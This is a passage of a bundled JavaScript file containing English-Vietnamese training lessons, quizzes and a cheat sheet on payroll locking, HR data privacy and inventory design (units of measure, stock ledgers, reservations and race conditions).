-- 0 rows updated → tell the user why`}}],remember:`Once locked, a payroll run never changes. Fix late changes as adjustments in the next run.
VI: Bảng lương đã chốt thì không sửa nữa. Thay đổi đến muộn được xử lý bằng điều chỉnh ở kỳ sau.`,questions:[{id:"hr-payroll.run.1",kind:"mcq",difficulty:"easy",prompt:`Why lock a payroll run after it is approved?
VI: Tại sao phải chốt (khóa) bảng lương sau khi đã duyệt?`,choices:["To make the next calculation run faster","So paid amounts and payslips never change","So that HR can edit it without approval","To hide the salaries from the accountant"],answer:1,why:`The bank file, payslips, tax and accounting all use those numbers. If the run changes later, they no longer match.
VI: File ngân hàng, phiếu lương, thuế và kế toán đều dùng các con số đó. Nếu bảng lương bị sửa sau, các số liệu sẽ không còn khớp.`},{id:"hr-payroll.run.2",kind:"scenario",difficulty:"medium",prompt:`A raise was approved on 10 May, valid from 1 April. April payroll is already locked and paid. What should happen?
VI: Tăng lương được duyệt ngày 10/5, hiệu lực từ 1/4. Bảng lương tháng 4 đã chốt và đã trả. Nên xử lý thế nào?`,choices:["Unlock April, recalculate it, and pay again","Ignore April because it is already locked","Pay May at the new rate plus April retro","Pay the new rate from June, after approval"],answer:2,why:`The locked April run stays as it was. The May run pays the new salary and adds the April difference as retro pay.
VI: Kỳ tháng 4 đã chốt giữ nguyên. Kỳ tháng 5 trả lương mới và cộng thêm phần chênh lệch tháng 4 dưới dạng truy lĩnh.`},{id:"hr-payroll.run.3",kind:"debug",difficulty:"hard",prompt:`The bank file total is a few dong lower than the payroll report total. The employee list is the same. What is the most likely cause?
VI: Tổng file ngân hàng thấp hơn tổng báo cáo lương vài đồng. Danh sách nhân viên giống nhau. Nguyên nhân có khả năng nhất là gì?`,choices:["The bank charges a small fee per transfer","One person is missing from the bank file","The two use different rounding rules","Someone changed the run after locking"],answer:2,why:`Rounding each line and rounding only the total give slightly different sums. A missing person would cause a much bigger gap.
VI: Làm tròn từng dòng và chỉ làm tròn tổng cho ra kết quả hơi khác nhau. Nếu thiếu một người thì chênh lệch sẽ lớn hơn nhiều.`},{id:"hr-payroll.run.4",kind:"truefalse",difficulty:"medium",prompt:"HR finds an error after payroll is paid. The developer should run an `UPDATE` on the locked lines to fix it.\nVI: Nếu HR phát hiện sai sót sau khi đã trả lương, lập trình viên nên chạy `UPDATE` trên các dòng đã chốt để sửa.",choices:["True","False"],answer:1,why:`The money has already left the bank. Create an adjustment in the next run, or an extra off-cycle run, so the history stays true.
VI: Tiền đã được chuyển đi rồi. Hãy tạo khoản điều chỉnh ở kỳ sau, hoặc một kỳ chi bổ sung, để lịch sử vẫn đúng.`}]},{id:"hr-payroll.privacy",title:"Privacy and access · Bảo mật và phân quyền",summary:`Salary and ID numbers are sensitive. Limit who sees them, and log it.
VI: Lương và số giấy tờ tùy thân là dữ liệu nhạy cảm. Giới hạn người xem và ghi lại nhật ký.`,minutes:4,blocks:[{type:"text",text:`HR systems hold **sensitive personal data**: salary, bank account, ID card number, tax code, health and family details.
A leak hurts real people and the company.
VI: Hệ thống nhân sự chứa **dữ liệu cá nhân nhạy cảm**: lương, tài khoản ngân hàng, số CCCD, mã số thuế, sức khỏe và thông tin gia đình.
VI: Lộ dữ liệu gây hại cho người thật và cho công ty.`},{type:"text",text:`**Role-based access** means rights come from the user’s role and scope. For example, a manager sees only their own team.
VI: **Phân quyền theo vai trò** nghĩa là quyền dựa trên vai trò và phạm vi của người dùng. Ví dụ quản lý chỉ thấy nhóm của mình.`},{type:"diagram",text:`Who sees what (example policy)
Data          Self  Manager HR  Payroll
───────────── ────  ─────── ─── ───────
Own payslip   Yes   No      Yes Yes
Team leave    -     Team    Yes No
Team salary   -     No      Yes Yes
Bank account  Own   No      Yes Yes`},{type:"list",items:["Audit log: who viewed or changed salary data, when, and the old and new value","Check ownership on the server for every request, not only in the menu","Exports to Excel are a common leak: limit them and log them","Test and dev databases: mask names, salary, bank and ID numbers first"]},{type:"code",code:{lang:"sql",text:`-- Run on the TEST copy, never on prod
UPDATE Employee SET
  FullName    = CONCAT('Employee ', Id),
  IdNumber    = RIGHT('000000000000'
                + CAST(Id AS varchar), 12),
  BankAccount = NULL;
UPDATE SalaryHistory
  SET Amount = 10000000;`}},{type:"example",title:"The changed URL",text:"An employee opens `/payslips/1041`, her own payslip. She types `1042` and sees a colleague’s salary. The menu was protected, but the API did not check ownership.\nVI: Một nhân viên mở `/payslips/1041`, phiếu lương của mình. Cô ấy gõ `1042` và thấy lương của đồng nghiệp. Menu đã được phân quyền, nhưng API không kiểm tra chủ sở hữu."},{type:"text",text:`Vietnam has laws on personal data protection. Ask the legal team which rules apply, for example consent and breach reporting.
VI: Việt Nam có quy định pháp luật về bảo vệ dữ liệu cá nhân. Hãy hỏi bộ phận pháp chế quy định nào áp dụng, ví dụ sự đồng ý và báo cáo khi lộ dữ liệu.`}],remember:`Show salary data only to people who need it, check it on the server, and log every access.
VI: Chỉ cho người cần thiết xem dữ liệu lương, kiểm tra quyền ở máy chủ và ghi nhật ký mọi lần truy cập.`,questions:[{id:"hr-payroll.privacy.1",kind:"mcq",difficulty:"easy",prompt:`In a common policy, what should a team manager see about their team?
VI: Theo chính sách thường gặp, quản lý nhóm nên được xem gì về nhóm mình?`,choices:["Everything HR sees, including bank accounts","Leave and attendance, but not salaries","Salaries of all teams, to compare them","Nothing at all, only HR may see data"],answer:1,why:`Managers approve leave and check attendance, so they need that data. Salary and bank data stay with HR and payroll unless policy says otherwise.
VI: Quản lý duyệt nghỉ phép và theo dõi chấm công nên cần dữ liệu đó. Lương và tài khoản ngân hàng chỉ HR và bộ phận lương được xem, trừ khi chính sách khác đi.`},{id:"hr-payroll.privacy.2",kind:"debug",difficulty:"medium",prompt:"Users cannot see other people’s payslips in the menu. But changing the id in `/api/payslips/1042` shows any payslip. What is missing?\nVI: Người dùng không thấy phiếu lương của người khác trên menu. Nhưng đổi id trong `/api/payslips/1042` thì xem được bất kỳ phiếu nào. Thiếu gì?",choices:["HTTPS on the payslip page","An ownership check in the API","A longer session timeout","A bigger random number for ids"],answer:1,why:`The server must check that the payslip belongs to the user. Or the user needs a role that allows it. Hiding a menu is not security.
VI: Máy chủ phải kiểm tra phiếu lương thuộc về người dùng, hoặc người dùng có vai trò được phép xem. Ẩn menu không phải là bảo mật.`},{id:"hr-payroll.privacy.3",kind:"scenario",difficulty:"medium",prompt:`A tester needs real-looking payroll data to test a bug. What is the safest way?
VI: Tester cần dữ liệu lương giống thật để kiểm thử một lỗi. Cách an toàn nhất là gì?`,choices:["Give the tester read access to production","Copy production to test, then mask it there","Mask the data first, then copy it to test","Email the tester an Excel export of salaries"],answer:2,why:`Mask before the data leaves production control. If you copy first, real salaries sit in a less protected place, even for a short time.
VI: Hãy che dữ liệu trước khi nó rời khỏi môi trường production. Nếu sao chép trước, lương thật sẽ nằm ở nơi kém bảo vệ hơn, dù chỉ một lúc.`},{id:"hr-payroll.privacy.4",kind:"truefalse",difficulty:"hard",prompt:`For salary data, the audit log should record only changes. Recording who viewed the data is not useful.
VI: Với dữ liệu lương, nhật ký chỉ cần ghi các lần sửa. Ghi lại ai đã xem dữ liệu là không có ích.`,choices:["True","False"],answer:1,why:`A leak usually comes from someone who only viewed or exported data. A view log helps find who saw it.
VI: Lộ dữ liệu thường đến từ người chỉ xem hoặc xuất dữ liệu. Nhật ký lượt xem giúp tìm ra ai đã thấy dữ liệu đó.`}]}],cheatSheet:[{title:"Records and time · Hồ sơ và thời gian",items:[{term:"Employee master · Hồ sơ nhân viên",meaning:`One row per person: code, name, ID, bank account.
VI: Một dòng cho mỗi người: mã, họ tên, số CCCD, tài khoản ngân hàng.`},{term:"Effective date · Ngày hiệu lực",meaning:`Rows with ValidFrom and ValidTo, so past months stay correct.
VI: Các dòng có ngày hiệu lực từ và đến, để các tháng cũ vẫn đúng.`},{term:"Raw punch · Lượt chấm công gốc",meaning:`One scan on the time clock: who, device, time.
VI: Một lần quét trên máy chấm công: ai, máy nào, mấy giờ.`},{term:"Shift · Ca làm việc",meaning:`Planned start and end. A night shift belongs to its start date.
VI: Giờ bắt đầu và kết thúc theo kế hoạch. Ca đêm tính cho ngày bắt đầu ca.`},{term:"Timesheet · Bảng chấm công",meaning:`Calculated result per day: OK, late, missing punch.
VI: Kết quả tính theo từng ngày: đủ công, đi muộn, thiếu lượt chấm.`}]},{title:"Leave and overtime · Nghỉ phép và làm thêm",items:[{term:"Leave balance · Quỹ phép",meaning:`Days left, built from a ledger of plus and minus lines.
VI: Số ngày phép còn lại, tính từ sổ ghi các dòng cộng và trừ.`},{term:"Accrual · Cộng dồn phép",meaning:`Leave earned over time, for example 1 day each month.
VI: Phép được cộng dần theo thời gian, ví dụ 1 ngày mỗi tháng.`},{term:"Carry-over · Phép tồn chuyển sang",meaning:`Unused days moved to next year, often with an end date.
VI: Phép chưa dùng chuyển sang năm sau, thường có hạn sử dụng.`},{term:"Overtime · Làm thêm giờ",meaning:`Approved work outside the schedule, paid at a day-type rate.
VI: Giờ làm ngoài lịch đã được duyệt, trả theo hệ số của loại ngày.`},{term:"OT cap · Giới hạn làm thêm",meaning:`Maximum OT hours per day, month and year. Check the total.
VI: Số giờ làm thêm tối đa theo ngày, tháng và năm. Kiểm tra trên tổng số giờ.`}]},{title:"Pay calculation · Tính lương",items:[{term:"Gross · Lương gross",meaning:`Total pay before any deduction.
VI: Tổng thu nhập trước mọi khoản khấu trừ.`},{term:"Net · Lương net",meaning:`What the employee receives: gross minus insurance and tax.
VI: Số tiền nhân viên thực nhận: gross trừ bảo hiểm và thuế.`},{term:"BHXH, BHYT, BHTN",meaning:`Social, health and unemployment insurance. Rates and caps change.
VI: Bảo hiểm xã hội, y tế và thất nghiệp. Tỷ lệ và mức trần có thể thay đổi.`},{term:"Thuế TNCN · Income tax",meaning:`Personal income tax after insurance and family deductions.
VI: Thuế thu nhập cá nhân, tính sau khi trừ bảo hiểm và giảm trừ gia cảnh.`},{term:"Tax-free allowance · Phụ cấp không chịu thuế",meaning:`Allowance not taxed, often only up to a limit.
VI: Phụ cấp không tính thuế, thường chỉ trong một hạn mức.`}]},{title:"Payroll run and privacy · Chạy lương và bảo mật",items:[{term:"Cut-off · Ngày chốt",meaning:`Last date for data in this period. Later changes go to the next one.
VI: Ngày cuối nhận dữ liệu cho kỳ này. Thay đổi sau đó tính vào kỳ sau.`},{term:"Lock · Chốt bảng lương",meaning:`Approved run becomes read-only before payment.
VI: Bảng lương đã duyệt chuyển sang chỉ đọc trước khi chi trả.`},{term:"Retro pay · Truy lĩnh",meaning:`Difference for a past period, paid in the current run.
VI: Phần chênh lệch của kỳ trước, được trả trong kỳ hiện tại.`},{term:"Bank file · File chuyển khoản",meaning:`List of accounts and amounts. Its sum must match payroll.
VI: Danh sách tài khoản và số tiền. Tổng phải khớp với bảng lương.`},{term:"Audit log · Nhật ký truy cập",meaning:`Who viewed or changed sensitive data, and when.
VI: Ai đã xem hoặc sửa dữ liệu nhạy cảm, và vào lúc nào.`},{term:"Masking · Che dữ liệu",meaning:`Replace real names, salary and IDs before data goes to test.
VI: Thay tên, lương và số giấy tờ thật trước khi đưa dữ liệu sang môi trường test.`}]}]},G=Object.freeze(Object.defineProperty({__proto__:null,default:j},Symbol.toStringTag,{value:"Module"})),K={id:"inventory",group:"domain",title:"Inventory & Goods",emoji:"📦",tagline:`Know what you have, where it is, and what it is worth.
VI: Biết mình có hàng gì, nằm ở đâu và đáng giá bao nhiêu.`,lessons:[{id:"inventory.items-units",title:"Items, SKUs and units of measure · Mã hàng, SKU và đơn vị tính",summary:`One item, many units. Store stock in one base unit.
VI: Một mặt hàng có nhiều đơn vị tính. Hãy lưu tồn kho theo một đơn vị gốc.`,minutes:4,blocks:[{type:"text",text:`The **item master** is the list of every product you keep in stock. Each row has a code, a name and a unit.
VI: **Danh mục hàng hóa** (item master) là danh sách mọi mặt hàng có trong kho. Mỗi dòng có mã hàng, tên hàng và đơn vị tính.
A **SKU** (stock keeping unit) is one thing you count separately. **Variants** are versions of one product, like size or color. Each variant is usually its own SKU.
VI: **SKU** là một mã hàng được đếm tồn riêng. **Biến thể** là các phiên bản của một sản phẩm, như size hoặc màu. Mỗi biến thể thường là một SKU riêng.`},{type:"diagram",text:`Product: T-shirt "Basic"
   │
   ├── SKU TS-RED-M   (red, size M)
   ├── SKU TS-RED-L   (red, size L)
   └── SKU TS-BLU-M   (blue, size M)

Stock is counted per SKU, not per product`},{type:"text",text:`A **unit of measure** (UoM) is how you count: piece, can, pack, carton, kg. You often buy in cartons and sell in single pieces.
VI: **Đơn vị tính** (ĐVT) là cách đếm hàng: cái, lon, lốc, thùng, kg. Thường mua theo thùng nhưng bán lẻ theo cái.
The **base unit** is the smallest unit you count. Every other unit has a **conversion factor** to it.
VI: **Đơn vị gốc** là đơn vị nhỏ nhất dùng để đếm. Mọi đơn vị khác có một **hệ số quy đổi** về đơn vị gốc.`},{type:"diagram",text:`Item: Soft drink 330ml   base unit = CAN
┌────────┬──────────┬──────────────┐
│ UoM    │ = base   │ used for     │
├────────┼──────────┼──────────────┤
│ CAN    │ 1        │ retail sale  │
│ PACK   │ 6        │ promo sale   │
│ CARTON │ 24       │ buy, receive │
└────────┴──────────┴──────────────┘
5 CARTON received → save 5 × 24 = 120 CAN`},{type:"example",title:"The rounding trap",text:`A shop stores stock in cartons with 2 decimals. One can is 1/24 = 0.0417 carton, saved as 0.04. After 24 single-can sales, the system removed only 0.96 carton. The shelf is empty, but the screen still shows 0.04 carton.
VI: Một cửa hàng lưu tồn theo thùng, làm tròn 2 số lẻ. Một lon là 1/24 = 0.0417 thùng, lưu thành 0.04. Bán lẻ 24 lon, hệ thống chỉ trừ 0.96 thùng. Kệ đã hết hàng nhưng màn hình vẫn còn 0.04 thùng.`},{type:"code",code:{lang:"sql",text:`-- Units of an item and their factors
CREATE TABLE ItemUom (
  ItemId  INT         NOT NULL,
  UomCode VARCHAR(10) NOT NULL, -- CAN, CARTON
  Factor  DECIMAL(18,6) NOT NULL, -- base units
  PRIMARY KEY (ItemId, UomCode)
);
-- Stock tables keep Qty in the base unit only`}},{type:"text",text:`IT side: save every stock quantity in the base unit. Convert only on screens and documents. Save the unit the user typed too, for printing.
VI: Phía IT: lưu mọi số lượng tồn theo đơn vị gốc. Chỉ quy đổi khi hiển thị hoặc in chứng từ. Lưu thêm đơn vị người dùng đã nhập để in phiếu.
Ask the business: can we sell half a carton? Which units can each screen use? Can the factor change later?
VI: Hỏi nghiệp vụ: có bán nửa thùng không? Màn hình nào được dùng đơn vị nào? Hệ số quy đổi có thể thay đổi sau này không?`}],remember:`Keep stock in one base unit. Convert only when people enter or read the data.
VI: Lưu tồn kho theo một đơn vị gốc. Chỉ quy đổi khi người dùng nhập hoặc xem dữ liệu.`,questions:[{id:"inventory.items-units.1",kind:"mcq",difficulty:"easy",prompt:`A T-shirt comes in 3 colors and 4 sizes. How many SKUs do you usually need to count its stock correctly?
VI: Một mẫu áo thun có 3 màu và 4 size. Thường cần bao nhiêu SKU để đếm tồn kho cho đúng?`,choices:["4","7","12","24"],answer:2,why:`Each color and size pair is counted separately: 3 × 4 = 12. One SKU per product hides that red size M is sold out.
VI: Mỗi cặp màu và size được đếm riêng: 3 × 4 = 12. Nếu chỉ có một mã cho cả sản phẩm, bạn sẽ không biết áo đỏ size M đã hết.`},{id:"inventory.items-units.2",kind:"scenario",difficulty:"medium",prompt:`The warehouse receives 5 cartons. One carton is 24 cans. The stock table uses cans as the base unit. What should the stock row save?
VI: Kho nhận 5 thùng. Một thùng có 24 lon. Bảng tồn kho dùng lon làm đơn vị gốc. Dòng tồn kho nên lưu gì?`,choices:["Qty 5, unit CARTON","Qty 120, unit CAN","Qty 5, unit CAN","Qty 0.2083, unit CAN"],answer:1,why:`Convert to the base unit: 5 × 24 = 120 cans. Then every sum and every check uses the same unit.
VI: Quy đổi về đơn vị gốc: 5 × 24 = 120 lon. Khi đó mọi phép cộng và kiểm tra đều dùng cùng một đơn vị.`},{id:"inventory.items-units.3",kind:"debug",difficulty:"medium",prompt:`Stock is stored in cartons, rounded to 2 decimals. After many single-can sales, the screen shows 0.04 carton. The shelf is empty. What is the most likely cause?
VI: Tồn kho lưu theo thùng, làm tròn 2 số lẻ. Sau nhiều lần bán lẻ từng lon, màn hình còn 0.04 thùng. Kệ đã trống. Nguyên nhân khả dĩ nhất là gì?`,choices:["Rounding when each can is converted to cartons","A thief took one can without a sales record","The stocktake was done in the wrong unit","The database lost one sale during a power cut"],answer:0,why:`One can is 0.0417 carton, saved as 0.04. Each sale removes a little too little, and the error adds up. Storing cans (the base unit) avoids it.
VI: Một lon là 0.0417 thùng nhưng lưu thành 0.04. Mỗi lần bán trừ thiếu một chút, sai số cộng dồn lại. Lưu theo lon (đơn vị gốc) sẽ tránh được lỗi này.`},{id:"inventory.items-units.4",kind:"compare",difficulty:"hard",prompt:`Which design is better for the quantity column in stock tables?
VI: Thiết kế nào tốt hơn cho cột số lượng trong các bảng tồn kho?`,choices:["Always the base unit; convert on screens and documents","The unit the user typed, with a unit code on each row"],answer:0,why:"With mixed units, a simple `SUM(Qty)` adds cans and cartons together. One base unit keeps sums and checks simple and correct.\nVI: Nếu trộn nhiều đơn vị, một lệnh `SUM(Qty)` sẽ cộng lẫn lon với thùng. Một đơn vị gốc giúp phép cộng và kiểm tra đơn giản, chính xác."}]},{id:"inventory.stock-ledger",title:"Stock is a ledger of movements · Tồn kho là sổ ghi các lần nhập xuất",summary:`Stock is the sum of all movements, never a number typed over.
VI: Tồn kho là tổng mọi lần nhập xuất, không phải một con số gõ đè lên.`,minutes:4,blocks:[{type:"text",text:`Stock changes only through **documents**. Each document creates **stock movements**: rows that add or remove a quantity.
VI: Tồn kho chỉ thay đổi qua **chứng từ kho**. Mỗi chứng từ tạo ra các dòng **biến động kho**: cộng thêm hoặc trừ bớt số lượng.`},{type:"list",items:[`**Receipt** (phiếu nhập kho): goods come in. Quantity is plus.
VI: Hàng vào kho, số lượng dương.`,`**Issue** (phiếu xuất kho): goods go out for a sale or for production. Quantity is minus.
VI: Hàng ra khỏi kho để bán hoặc để sản xuất, số lượng âm.`,`**Transfer** (phiếu chuyển kho): minus in one warehouse, plus in another. The company total stays the same.
VI: Trừ ở kho này, cộng ở kho kia. Tổng tồn của công ty không đổi.`,`**Adjustment** (phiếu điều chỉnh): fixes stock after a count, damage or loss. Plus or minus.
VI: Sửa tồn sau kiểm kê, hàng hỏng hoặc mất. Có thể dương hoặc âm.`]},{type:"diagram",text:`StockMovement  item CAN-COKE, kho HN
┌────┬───────┬────────┬──────┬──────┐
│ Id │ Date  │ Doc    │ Qty  │ Bal  │
├────┼───────┼────────┼──────┼──────┤
│ 1  │ 01/03 │ NK-001 │ +120 │ 120  │
│ 2  │ 02/03 │ XK-015 │  -30 │  90  │
│ 3  │ 03/03 │ CK-004 │  -40 │  50  │
│ 4  │ 05/03 │ DC-002 │   -2 │  48  │
└────┴───────┴────────┴──────┴──────┘
NK receipt · XK issue · CK transfer
DC adjustment
On hand = SUM(Qty) = 48`},{type:"code",code:{lang:"sql",text:`-- On hand per item and warehouse
SELECT ItemId, WarehouseId,
       SUM(Qty) AS OnHand
FROM StockMovement
GROUP BY ItemId, WarehouseId;`}},{type:"compare",left:{title:"Overwrite a Quantity field ⚠️",items:["No history: who changed it, and why?","Two users overwrite each other","Cannot show stock on a past date"]},right:{title:"Ledger of movements ✅",items:["Every change links to a document","Stock on any date = sum up to that date","A fast balance table can be rebuilt from it"]}},{type:"text",text:`Big systems also keep a **balance table** for fast reads. Update it in the **same transaction** as the movement. The ledger stays the source of truth.
VI: Hệ thống lớn thường có thêm **bảng số dư tồn** để đọc nhanh. Cập nhật bảng này **trong cùng giao dịch** với dòng biến động. Sổ biến động vẫn là nguồn dữ liệu gốc.`},{type:"example",title:"Negative stock",text:`A cashier sells 5 cans, but the receipt for that delivery is not entered yet. Stock becomes −5. Some shops allow this and fix it later. Others block the sale.
VI: Thu ngân bán 5 lon, nhưng phiếu nhập của lô hàng đó chưa được nhập vào máy. Tồn kho thành −5. Có nơi cho phép và sửa sau. Có nơi chặn không cho bán.`},{type:"text",text:`Ask the business: is negative stock allowed, and in which warehouses? Can a posted document be edited, or only cancelled with a reverse document?
VI: Hỏi nghiệp vụ: có cho phép tồn âm không, ở kho nào? Chứng từ đã ghi sổ có được sửa không, hay chỉ được hủy bằng chứng từ đảo ngược?`}],remember:`Stock is the sum of movements. Never edit the stock number directly.
VI: Tồn kho là tổng các dòng nhập xuất. Không bao giờ sửa trực tiếp con số tồn.`,questions:[{id:"inventory.stock-ledger.1",kind:"mcq",difficulty:"easy",prompt:`Goods move from the Hanoi warehouse to the HCMC warehouse. What should the transfer document create?
VI: Hàng chuyển từ kho Hà Nội sang kho TP.HCM. Phiếu chuyển kho nên tạo ra những gì?`,choices:["A minus row in Hanoi and a plus row in HCMC","A plus row in HCMC only","A minus row in Hanoi only","An edit of the Quantity field in both warehouses"],answer:0,why:`A transfer is two movements: out of one place, into another. The company total does not change.
VI: Chuyển kho gồm hai dòng biến động: xuất khỏi kho này, nhập vào kho kia. Tổng tồn của công ty không đổi.`},{id:"inventory.stock-ledger.2",kind:"scenario",difficulty:"medium",prompt:`After a count, a user wants a screen to type the new stock number directly. What is the better design?
VI: Sau kiểm kê, người dùng muốn một màn hình để gõ thẳng số tồn mới. Thiết kế nào tốt hơn?`,choices:["Post an adjustment with the difference and a reason","Update the Quantity column to the counted number","Delete old movements and insert one row with the count","Let the user edit the qty of the latest movement row"],answer:0,why:`An adjustment keeps history: who changed stock, by how much, and why. Overwriting or deleting rows destroys the audit trail.
VI: Phiếu điều chỉnh giữ lại lịch sử: ai sửa, sửa bao nhiêu và vì sao. Ghi đè hoặc xóa dòng sẽ làm mất dấu vết kiểm tra.`},{id:"inventory.stock-ledger.3",kind:"code",difficulty:"easy",prompt:`What is the on-hand quantity for this item?
VI: Tồn thực tế của mặt hàng này là bao nhiêu?`,code:{lang:"text",text:`StockMovement: item A, warehouse 1
Qty: +100, -20, -30, +50, -10`},choices:["90","100","110","210"],answer:0,why:`100 − 20 − 30 + 50 − 10 = 90. On hand is simply the sum of all movements.
VI: 100 − 20 − 30 + 50 − 10 = 90. Tồn thực tế chỉ là tổng của mọi dòng biến động.`},{id:"inventory.stock-ledger.4",kind:"debug",difficulty:"hard",prompt:"The `StockBalance` table says 50. `SUM(Qty)` from the movement ledger says 47. What is the most likely cause?\nVI: Bảng `StockBalance` ghi 50. `SUM(Qty)` từ sổ biến động ra 47. Nguyên nhân khả dĩ nhất là gì?",choices:["Some code changed the balance without a movement in one transaction","SUM ignores negative numbers, so the ledger total is too low","The ledger has rounding errors, because Qty is an integer","Normal: the balance is always a little ahead of the ledger"],answer:0,why:`The balance and the movement must be saved together. If one path skips the movement, or saves them in two transactions, they drift apart.
VI: Số dư và dòng biến động phải được lưu cùng nhau. Nếu một đoạn code bỏ qua dòng biến động, hoặc lưu bằng hai giao dịch riêng, hai số sẽ lệch nhau.`},{id:"inventory.stock-ledger.5",kind:"truefalse",difficulty:"medium",prompt:`Negative stock is always a bug, so the system must always block it.
VI: Tồn âm luôn là lỗi, nên hệ thống phải luôn chặn nó.`,choices:["True","False"],answer:1,why:`It is a business decision. Some shops allow it so sales do not stop when a receipt is late. Ask, and make it a setting.
VI: Đây là quyết định của nghiệp vụ. Có nơi cho phép để không phải dừng bán khi phiếu nhập về trễ. Hãy hỏi và làm thành một tùy chọn cấu hình.`}]},{id:"inventory.available",title:"On hand, reserved, available · Tồn thực tế, đã giữ, khả dụng",summary:`Not all stock on the shelf can still be sold.
VI: Không phải hàng nào trên kệ cũng còn bán được.`,minutes:5,blocks:[{type:"text",text:`**On hand** is what is really in the warehouse. **Reserved** is stock promised to orders but not shipped yet.
VI: **Tồn thực tế** (on hand) là hàng đang thật sự nằm trong kho. **Đã giữ** (reserved) là hàng đã hứa cho đơn nhưng chưa xuất.
**Available** = on hand − reserved. This is what you can still sell now. **Incoming** is stock on purchase orders, not received yet.
VI: **Tồn khả dụng** = tồn thực tế − đã giữ. Đây là số còn bán được ngay. **Hàng đang về** là hàng trên đơn mua, chưa nhập kho.`},{type:"diagram",text:`Laptop X1 · Warehouse HCM
┌───────────┬──────┐
│ On hand   │   10 │ in the warehouse
│ Reserved  │  - 7 │ orders not shipped
├───────────┼──────┤
│ Available │    3 │ can sell now
│ Incoming  │ + 20 │ PO due 15/04
└───────────┴──────┘
ATP on 15/04 = 3 + 20 = 23`},{type:"text",text:`**Available to promise** (ATP) answers one question: can we promise 15 units on this date? It adds incoming stock due by that date. It subtracts what is already promised from it.
VI: **Có thể hứa giao** (ATP) trả lời câu hỏi: "Ngày đó hứa giao 15 cái được không?". Nó cộng hàng đang về trước ngày đó và trừ phần đã hứa cho đơn khác.`},{type:"diagram",text:`Available = 1 (the last laptop)
 Order A                 Order B
 read available → 1      read available → 1
 1 ≥ 1, OK               1 ≥ 1, OK
 reserve 1               reserve 1
   │                       │
   └────► Reserved = 2 ◄───┘
   On hand = 1 → one customer gets nothing`},{type:"text",text:`This is a **race condition**: two requests read the same value, then both act on it. Tests with one user never show it.
VI: Đây là **tranh chấp đồng thời** (race condition): hai yêu cầu cùng đọc một giá trị rồi cùng hành động. Kiểm thử với một người dùng sẽ không bao giờ thấy lỗi này.
Fix: check and reserve in **one atomic step**. One SQL statement can do both.
VI: Cách sửa: kiểm tra và giữ hàng trong **một bước không thể tách rời**. Một câu lệnh SQL có thể làm cả hai.`},{type:"code",code:{lang:"sql",text:`-- Check and reserve in ONE statement
UPDATE StockBalance
SET    Reserved = Reserved + @qty
WHERE  ItemId = @item
  AND  WarehouseId = @wh
  AND  OnHand - Reserved >= @qty;
-- 0 rows updated → not enough stock`}},{type:"example",title:"Flash sale",text:`A shop sells 100 phones at 9:00. Thousands of people click "Buy" in the same second. With a read-then-write check, it may accept 130 orders. Then staff must call 30 angry customers.
VI: Một shop mở bán 100 điện thoại lúc 9 giờ. Hàng nghìn người bấm "Mua" cùng một giây. Nếu đọc rồi mới ghi, hệ thống có thể nhận 130 đơn. Sau đó nhân viên phải gọi xin lỗi 30 khách.`},{type:"text",text:`Ask the business: when is stock reserved: at cart, at order, or at payment? When does a reservation expire? Can sales sell incoming stock?
VI: Hỏi nghiệp vụ: giữ hàng lúc nào: khi thêm vào giỏ, khi đặt đơn hay khi thanh toán? Bao lâu thì hết hạn giữ? Kinh doanh có được bán hàng đang về không?`}],remember:`Sell from available, not on hand. Check and reserve in one atomic step.
VI: Bán theo tồn khả dụng, không theo tồn thực tế. Kiểm tra và giữ hàng trong cùng một bước.`,questions:[{id:"inventory.available.1",kind:"mcq",difficulty:"easy",prompt:`A customer wants units today. How many can you sell from stock right now?
VI: Khách cần hàng ngay hôm nay. Hiện tại bạn bán được tối đa bao nhiêu từ tồn kho?`,code:{lang:"text",text:`On hand:                    50
Reserved:                   35
Incoming (PO due next week): 40`},choices:["15","50","55","90"],answer:0,why:`Available = 50 − 35 = 15. The 35 units belong to other orders. Incoming stock is not here yet.
VI: Khả dụng = 50 − 35 = 15. 35 cái đã thuộc về đơn khác. Hàng đang về thì chưa có trong kho.`},{id:"inventory.available.2",kind:"debug",difficulty:"medium",prompt:`Only one unit was left, but two customers both got "Order confirmed". What is the cause in this code?
VI: Chỉ còn một cái, nhưng cả hai khách đều nhận "Đặt hàng thành công". Nguyên nhân trong đoạn code này là gì?`,code:{lang:"ts",text:`const bal = await repo.getBalance(item);
if (bal.onHand - bal.reserved >= qty) {
  bal.reserved += qty;
  await repo.save(bal);
}`},choices:["A race between the read and the save","The formula forgot incoming stock","A missing index on the ItemId column","The qty is in the wrong unit of measure"],answer:0,why:`Both requests read reserved = 0 before either one saves. Both pass the check. The check and the update must be one atomic step.
VI: Cả hai yêu cầu đều đọc reserved = 0 trước khi bên nào kịp lưu. Cả hai đều qua bước kiểm tra. Kiểm tra và cập nhật phải là một bước duy nhất.`},{id:"inventory.available.3",kind:"compare",difficulty:"medium",prompt:`Which way of reserving stock is safe when many users order at once?
VI: Cách giữ hàng nào an toàn khi nhiều người đặt cùng lúc?`,choices:["Read available in the app, then save the new Reserved","One UPDATE with the stock check inside its WHERE"],answer:1,why:`The database locks the row while it runs the UPDATE, so the check and the change happen together. Then check how many rows were updated.
VI: Cơ sở dữ liệu khóa dòng khi chạy UPDATE, nên kiểm tra và thay đổi xảy ra cùng lúc. Sau đó kiểm tra số dòng đã được cập nhật.`},{id:"inventory.available.4",kind:"scenario",difficulty:"hard",prompt:`Sales wants to promise 30 units for next Friday. Available today is 10. A PO for 25 arrives Wednesday. 5 units of that PO are already promised. Can sales promise 30?
VI: Kinh doanh muốn hứa giao 30 cái vào thứ Sáu tới. Hôm nay khả dụng là 10. Một đơn mua 25 cái về vào thứ Tư. 5 cái trong đó đã hứa cho đơn khác. Có hứa được 30 không?`,choices:["Yes, ATP by Friday is 30","No, only 10 are available today","Yes, ATP by Friday is 35","No, ATP by Friday is 25"],answer:0,why:`ATP = 10 + 25 − 5 = 30. But the PO can be late, so ask how much risk sales may take.
VI: ATP = 10 + 25 − 5 = 30. Nhưng hàng có thể về trễ, nên cần hỏi kinh doanh được chấp nhận rủi ro tới đâu.`},{id:"inventory.available.5",kind:"scenario",difficulty:"medium",prompt:`Stock is reserved when a customer adds an item to the cart. Many customers leave without paying. What problem appears?
VI: Hàng được giữ ngay khi khách thêm vào giỏ. Nhiều khách bỏ đi mà không thanh toán. Vấn đề gì sẽ xảy ra?`,choices:['Old carts hold stock, so real buyers see "sold out"',"On hand drops below zero for items in old carts","Incoming stock is counted twice in the ATP","Nothing, because carts never touch stock data"],answer:0,why:`Reservations from abandoned carts block real sales. Add an expiry time, or reserve only at order or payment.
